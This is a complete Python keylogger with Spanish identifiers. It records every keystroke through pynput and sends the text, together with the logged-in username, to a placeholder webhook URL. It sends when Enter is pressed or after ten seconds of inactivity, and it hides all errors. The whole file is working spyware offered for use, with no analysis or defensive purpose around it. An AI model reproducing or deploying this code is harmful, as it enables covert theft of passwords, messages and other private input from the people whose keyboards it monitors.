from pynput.keyboard import Key, Listener
import getpass
import requests
import time
import threading

webhook = "Tu webhook"
usuario = getpass.getuser()

buffer = []
last_time = time.time()
inactivity_timeout = 10

def presionar_tecla(key):
    global last_time
    last_time = time.time()
    try:
        if isinstance(key, Key):
            if key == Key.space:
                buffer.append(" ")
            elif key == Key.enter:
                buffer.append("\n")
                enviar_datos()
            elif key in {Key.shift, Key.shift_r, Key.shift_l, Key.ctrl_l, Key.ctrl_r, Key.alt_l, Key.alt_r, Key.esc, Key.backspace, Key.caps_lock}:
                return
            else:
                buffer.append(f"[{str(key)}]")
        else:
            buffer.append(str(key).replace("'", ""))
    except:
        pass

def enviar_datos():
    global buffer
    if buffer:
        mensaje = "".join(buffer)
        if mensaje.strip():
            payload = {"content": f"Usuario: {usuario}\nMensaje: {mensaje}"}
            try:
                requests.post(webhook, json=payload)
            except:
                pass
        buffer.clear()

def verificar_inactividad():
    while True:
        time.sleep(inactivity_timeout)
        if time.time() - last_time >= inactivity_timeout and buffer:
            enviar_datos()

threading.Thread(target=verificar_inactividad, daemon=True).start()

def soltar_tecla(key):
    if key == Key.esc:
        return False

with Listener(on_press=presionar_tecla, on_release=soltar_tecla) as listener:
    listener.join()

